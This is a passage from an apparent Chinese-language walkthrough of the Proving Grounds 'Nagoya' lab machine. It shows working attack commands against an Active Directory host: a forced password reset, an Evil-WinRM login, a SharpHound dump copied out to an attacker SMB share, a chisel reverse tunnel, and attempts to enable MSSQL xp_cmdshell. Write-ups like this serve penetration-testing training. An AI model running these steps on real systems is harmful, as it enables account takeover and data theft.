</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Group Policy Creator Owners<span class="o">]</span> rid:<span class="o">[</span>0x208<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Read-only Domain Controllers<span class="o">]</span> rid:<span class="o">[</span>0x209<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Cloneable Domain Controllers<span class="o">]</span> rid:<span class="o">[</span>0x20a<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Protected Users<span class="o">]</span> rid:<span class="o">[</span>0x20d<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Key Admins<span class="o">]</span> rid:<span class="o">[</span>0x20e<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Enterprise Key Admins<span class="o">]</span> rid:<span class="o">[</span>0x20f<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>DnsUpdateProxy<span class="o">]</span> rid:<span class="o">[</span>0x44e<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>employees<span class="o">]</span> rid:<span class="o">[</span>0x451<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>helpdesk<span class="o">]</span> rid:<span class="o">[</span>0x466<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>developers<span class="o">]</span> rid:<span class="o">[</span>0x46a<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 查询用户所属组</span>
</span></span><span class="line"><span class="cl">rpcclient $&gt; queryusergroups 0x45c
</span></span><span class="line"><span class="cl">        group rid:<span class="o">[</span>0x201<span class="o">]</span> attr:<span class="o">[</span>0x7<span class="o">]</span>
</span></span><span class="line"><span class="cl">        group rid:<span class="o">[</span>0x451<span class="o">]</span> attr:<span class="o">[</span>0x7<span class="o">]</span>
</span></span><span class="line"><span class="cl">……
</span></span><span class="line"><span class="cl">rpcclient $&gt; queryusergroups 0x46c
</span></span><span class="line"><span class="cl">        group rid:<span class="o">[</span>0x201<span class="o">]</span> attr:<span class="o">[</span>0x7<span class="o">]</span>
</span></span><span class="line"><span class="cl">        group rid:<span class="o">[</span>0x46a<span class="o">]</span> attr:<span class="o">[</span>0x7<span class="o">]</span>
</span></span><span class="line"><span class="cl">        group rid:<span class="o">[</span>0x451<span class="o">]</span> attr:<span class="o">[</span>0x7<span class="o">]</span></span></span></code></pre></td></tr></table>
</div>
</div><p>发现用户Christopher.Lewis 有三个组：Domain Users、employees 和 developers，比其他用户多一个 developers 组，推测是开发人员。</p>
<p>这里没有远程管理的组，猜测 developers 组是否能远程。尝试修改 Christopher.Lewis 用户密码。svc_helpdesk 账号对christopher.lewis 具有完全控制权限，可以重置其账号</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">rpcclient $&gt; setuserinfo christopher.lewis <span class="m">23</span> <span class="s1">&#39;Admin@123&#39;</span></span></span></code></pre></td></tr></table>
</div>
</div><p>尝试远程登录。使用Evil-WinRM登录成功</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Nagoya<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ evil-winrm -u christopher.lewis -p <span class="s1">&#39;Admin@123&#39;</span> -i 192.168.166.21
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function</span> is unimplemented on this machine                                                                                                           
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\C</span>hristopher.Lewis<span class="se">\D</span>ocuments&gt; ls
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\C</span>hristopher.Lewis<span class="se">\D</span>ocuments&gt; whoami
</span></span><span class="line"><span class="cl">nagoya-ind<span class="se">\c</span>hristopher.lewis
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\C</span>hristopher.Lewis&gt; <span class="nb">type</span> C:<span class="se">\l</span>ocal.txt
</span></span><span class="line"><span class="cl">81950a6ba1771f388080cb994a7fcb33</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="prive" class="heading-element"><span>PrivE</span>
  <a href="#prive" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>上传sharphound进行信息搜集</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\t</span>mp&gt; upload SharpHound.exe
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\t</span>mp&gt; ./SharpHound.exe -c All --OutputPrefix <span class="s2">&#34;Nagoya-&#34;</span>
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\t</span>mp&gt; download Nagoya-_20240207014142_BloodHound.zip</span></span></code></pre></td></tr></table>
</div>
</div><p>下载过程一直失败，使用SMB进行文件传输。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Nagoya<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ impacket-smbserver share <span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span> -smb2support                            
</span></span><span class="line"><span class="cl">Impacket v0.10.0 - Copyright <span class="m">2022</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Callback added <span class="k">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Callback added <span class="k">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\t</span>mp&gt; copy Nagoya-_20240207014142_BloodHound.zip <span class="se">\\</span>192.168.45.193<span class="se">\s</span>hare<span class="se">\N</span>agoya-_20240207014142_BloodHound.zip</span></span></code></pre></td></tr></table>
</div>
</div><p><a class="lightgallery" href="/posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207180428672.png?size=large" data-thumbnail="/posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207180428672.png?size=small" data-sub-html="<h2>image-20240207180428672</h2>"><img loading="lazy" src="/posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207180428672.png" alt="image-20240207180428672" srcset="/posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207180428672.png?size=small, /posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207180428672.png?size=medium 1.5x, /posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207180428672.png?size=large 2x" data-title="image-20240207180428672" style="--width: 757px;--aspect-ratio: 757 / 340;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>没分析出有用信息。</p>
<h3 id="mssql" class="heading-element"><span>MSSQL</span>
  <a href="#mssql" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>考虑到有个mssql账户，查看当前端口列表，发现存在1433端口，说明有mssql服务。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">*Evil-WinRM* PS C:\tmp&gt; netstat -anop TCP
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Active Connections
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  Proto  Local Address          Foreign Address        State           PID
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       628
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       880
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       628
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       628
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       880
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       628
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       2264
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       628
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       628
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1016
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2624
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       480
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       760
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       628
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       1008
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       1008
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       628
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:49671          0.0.0.0:0              LISTENING       628
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:49672          0.0.0.0:0              LISTENING       2476
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:49677          0.0.0.0:0              LISTENING       620
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:49684          0.0.0.0:0              LISTENING       628
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:49691          0.0.0.0:0              LISTENING       2616
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:49710          0.0.0.0:0              LISTENING       2648
</span></span><span class="line"><span class="cl">  TCP    0.0.0.0:52804          0.0.0.0:0              LISTENING       2264
</span></span><span class="line"><span class="cl">  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2616
</span></span><span class="line"><span class="cl">  TCP    127.0.0.1:389          127.0.0.1:49674        ESTABLISHED     628
</span></span><span class="line"><span class="cl">  TCP    127.0.0.1:389          127.0.0.1:49676        ESTABLISHED     628
</span></span><span class="line"><span class="cl">  TCP    127.0.0.1:389          127.0.0.1:49742        ESTABLISHED     628
</span></span><span class="line"><span class="cl">  TCP    127.0.0.1:49674        127.0.0.1:389          ESTABLISHED     2684
</span></span><span class="line"><span class="cl">  TCP    127.0.0.1:49676        127.0.0.1:389          ESTABLISHED     2684
</span></span><span class="line"><span class="cl">  TCP    127.0.0.1:49742        127.0.0.1:389          ESTABLISHED     2616
</span></span><span class="line"><span class="cl">  TCP    192.168.166.21:53      0.0.0.0:0              LISTENING       2616
</span></span><span class="line"><span class="cl">  TCP    192.168.166.21:139     0.0.0.0:0              LISTENING       4
</span></span><span class="line"><span class="cl">  TCP    192.168.166.21:389     192.168.166.21:49771   ESTABLISHED     628
</span></span><span class="line"><span class="cl">  TCP    192.168.166.21:389     192.168.166.21:49839   ESTABLISHED     628
</span></span><span class="line"><span class="cl">  TCP    192.168.166.21:389     192.168.166.21:49846   ESTABLISHED     628
</span></span><span class="line"><span class="cl">  TCP    192.168.166.21:445     192.168.45.193:54162   ESTABLISHED     4
</span></span><span class="line"><span class="cl">  TCP    192.168.166.21:5985    192.168.45.193:34646   TIME_WAIT       0
</span></span><span class="line"><span class="cl">  TCP    192.168.166.21:5985    192.168.45.193:34658   ESTABLISHED     4
</span></span><span class="line"><span class="cl">  TCP    192.168.166.21:5985    192.168.45.193:55274   TIME_WAIT       0
</span></span><span class="line"><span class="cl">  TCP    192.168.166.21:49771   192.168.166.21:389     ESTABLISHED     2616
</span></span><span class="line"><span class="cl">  TCP    192.168.166.21:49839   192.168.166.21:389     ESTABLISHED     2648
</span></span><span class="line"><span class="cl">  TCP    192.168.166.21:49846   192.168.166.21:389     ESTABLISHED     2648
</span></span><span class="line"><span class="cl">  TCP    192.168.166.21:50482   52.168.117.173:443     ESTABLISHED     3488
</span></span><span class="line"><span class="cl">  TCP    192.168.166.21:50490   23.77.197.149:80       SYN_SENT        3488</span></span></code></pre></td></tr></table>
</div>
</div><p><a class="lightgallery" href="/posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207195152442.png?size=large" data-thumbnail="/posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207195152442.png?size=small" data-sub-html="<h2>image-20240207195152442</h2>"><img loading="lazy" src="/posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207195152442.png" alt="image-20240207195152442" srcset="/posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207195152442.png?size=small, /posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207195152442.png?size=medium 1.5x, /posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207195152442.png?size=large 2x" data-title="image-20240207195152442" style="--width: 706px;--aspect-ratio: 706 / 485;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>上传chisel 进行端口转发，将1433端口代理出来</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\t</span>mp&gt; upload chisel.exe
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\t</span>mp&gt; cmd /c <span class="s1">&#39;C:\tmp\chisel.exe client 192.168.45.193:8000 R:1433:127.0.0.1:1433&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># kali</span>
</span></span><span class="line"><span class="cl">$ chisel server -p <span class="m">8000</span> --reverse</span></span></code></pre></td></tr></table>
</div>
</div><p>本地登录</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Nagoya<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ impacket-mssqlclient svc_mssql:<span class="s1">&#39;Service1&#39;</span>@127.0.0.1 -windows-auth
</span></span><span class="line"><span class="cl">Impacket v0.10.0 - Copyright <span class="m">2022</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Encryption required, switching to TLS
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: <span class="m">16192</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> INFO<span class="o">(</span>nagoya<span class="se">\S</span>QLEXPRESS<span class="o">)</span>: Line 1: Changed database context to <span class="s1">&#39;master&#39;</span>.
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> INFO<span class="o">(</span>nagoya<span class="se">\S</span>QLEXPRESS<span class="o">)</span>: Line 1: Changed language setting to us_english.
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ACK: Result: <span class="m">1</span> - Microsoft SQL Server <span class="o">(</span><span class="m">160</span> 3232<span class="o">)</span> 
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
</span></span><span class="line"><span class="cl">SQL&gt; </span></span></code></pre></td></tr></table>
</div>
</div><p>尝试启用xp_cmdshell失败，权限不足</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-zed" data-lang="zed"><span class="line"><span class="cl"><span class="n">SQL</span><span class="o">&gt;</span><span class="w"> </span><span class="n">exec</span><span class="w"> </span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="err">&#39;</span><span class="n">whoami</span><span class="err">&#39;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">[</span><span class="o">-</span><span class="p">]</span><span class="w"> </span><span class="n">ERROR</span><span class="p">(</span><span class="n">nagoya</span><span class="err">\</span><span class="n">SQLEXPRESS</span><span class="p">)</span><span class="o">:</span><span class="w"> </span><span class="n">Line</span><span class="w"> </span><span class="err">1</span><span class="o">:</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">EXECUTE</span><span class="w"> </span><span class="kd">permission</span><span class="w"> </span><span class="n">was</span><span class="w"> </span><span class="n">denied</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">object</span><span class="w"> </span><span class="err">&#39;</span><span class="n">xp_cmdshell</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">database</span><span class="w"> </span><span class="err">&#39;</span><span class="n">mssqlsystemresource</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">schema</span><span class="w"> </span><span class="err">&#39;</span><span class="n">sys</span><span class="err">&#39;</span><span class="p">.</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SQL</span><span class="o">&gt;</span><span class="w"> </span><span class="n">EXEC</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="err">&#39;</span><span class="n">show</span><span class="w"> </span><span class="n">advanced</span><span class="w"> </span><span class="n">options</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">1</span><span class="p">;</span><span class="n">RECONFIGURE</span><span class="p">;</span><span class="n">EXEC</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="err">&#39;</span><span class="n">xp_cmdshell</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">1</span><span class="p">;</span><span class="n">RECONFIGURE</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">[</span><span class="o">-</span><span class="p">]</span><span class="w"> </span><span class="n">ERROR</span><span class="p">(</span><span class="n">nagoya</span><span class="err">\</span><span class="n">SQLEXPRESS</span><span class="p">)</span><span class="o">:</span><span class="w"> </span><span class="n">Line</span><span class="w"> </span><span class="err">105</span><span class="o">:</span><span class="w"> </span><span class="n">User</span><span class="w"> </span><span class="n">does</span><span class="w"> </span><span class="n">not</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="kd">permission</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">perform</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">action</span><span class="p">.</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">[</span><span class="o">-</span><span class="p">]</span><span class="w"> </span><span class="n">ERROR</span><span class="p">(</span><span class="n">nagoya</span><span class="err">\</span><span class="n">SQLEXPRESS</span><span class="p">)</span><span class="o">:</span><span class="w"> </span><span class="n">Line</span><span class="w"> </span><span class="err">1</span><span class="o">:</span><span class="w"> </span><span class="n">You</span><span class="w"> </span><span class="n">do</span><span class="w"> </span><span class="n">not</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="kd">permission</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">RECONFIGURE</span><span class="w"> </span><span class="n">statement</span><span class="p">.</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">[</span><span class="o">-</span><span class="p">]</span><span class="w"> </span><span class="n">ERROR</span><span class="p">(</span><span class="n">nagoya</span><span class="err">\</span><span class="n">SQLEXPRESS</span><span class="p">)</span><span class="o">:</span><span class="w"> </span><span class="n">Line</span><span class="w"> </span><span class="err">62</span><span class="o">:</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">configuration</span><span class="w"> </span><span class="n">option</span><span class="w"> </span><span class="err">&#39;</span><span class="n">xp_cmdshell</span><span class="err">&#39;</span><span class="w"> </span><span class="n">does</span><span class="w"> </span><span class="n">not</span><span class="w"> </span><span class="n">exist</span><span class="p">,</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">advanced</span><span class="w"> </span><span class="n">option</span><span class="p">.</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">[</span><span class="o">-</span><span class="p">]</span><span class="w"> </span><span class="n">ERROR</span><span class="p">(</span><span class="n">nagoya</span><span class="err">\</span><span class="n">SQLEXPRESS</span><span class="p">)</span><span class="o">:</span><span class="w"> </span><span class="n">Line</span><span class="w"> </span><span class="err">1</span><span class="o">:</span><span class="w"> </span><span class="n">You</span><span class="w"> </span><span class="n">do</span><span class="w"> </span><span class="n">not</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="kd">permission</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">RECONFIGURE</span><span class="w"> </span><span class="n">statement</span><span class="p">.</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SQL</span><span class="o">&gt;</span><span class="w"> </span></span></span></code></pre></td></tr></table>
</div>
</div><h3 id="hint-3" class="heading-element"><span>Hint-3</span>
  <a href="#hint-3" class="heading-mark">
